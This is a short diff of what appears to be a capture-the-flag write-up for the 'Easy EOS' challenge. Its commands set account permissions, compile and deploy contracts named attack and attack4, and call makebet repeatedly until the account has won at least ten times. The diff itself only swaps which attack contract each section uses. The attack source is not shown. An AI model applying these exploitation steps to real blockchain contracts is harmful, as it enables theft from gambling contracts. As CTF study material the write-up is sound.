@@ -35,8 +35,8 @@ hint for [Easy EOS]: if you lost，you can't bet anymore with this account.
 # 设置权限
 cleos set account permission gllrgjlqclkp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"gllrgjlqclkp","permission":"eosio.code"},"weight":1}]}' owner -p gllrgjlqclkp@owner
 # 编译合约
-cd attack
-eosio-cpp -o attack.wasm attack.cpp
+cd attack4
+eosio-cpp -o attack4.wasm attack4.cpp
 # 部署合约
 cleos set contract gllrgjlqclkp . -p gllrgjlqclkp@active
 # 调用makebet方法多次，直到账号win次数大于等于10
@@ -55,8 +55,8 @@ cleos push action de1ctftest11 sendmail '["gllrgjlqclkp", "xxxx@qq.com"]' -p gll
 # 设置权限
 cleos set account permission btdaciaibmfp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"btdaciaibmfp","permission":"eosio.code"},"weight":1}]}' owner -p btdaciaibmfp@owner
 # 编译合约
-cd attack4
-eosio-cpp -o attack4.wasm attack4.cpp
+cd attack
+eosio-cpp -o attack.wasm attack.cpp
 # 部署合约
 cleos set contract btdaciaibmfp . -p btdaciaibmfp@active
 # 调用makebet方法10次
